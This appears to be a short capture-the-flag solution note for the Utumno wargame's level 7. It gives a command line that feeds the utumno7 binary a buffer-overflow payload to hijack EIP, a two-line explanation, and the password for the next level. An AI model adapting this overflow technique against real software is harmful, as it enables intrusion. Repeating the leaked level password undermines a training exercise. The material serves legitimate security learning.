Maybe: 140

```
/utumno/utumno7 aaaa$(python -c "print '\x4e\xdf\xff\xff'")caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab$(python -c 'print "\xcc\xd4\xff\xff"')
```

The first one is to control eip
The second one is to bypass a copy from eax to ebp-0x4, which otherwise could fail
and halt the program.

utumno8:jaeyeetiav
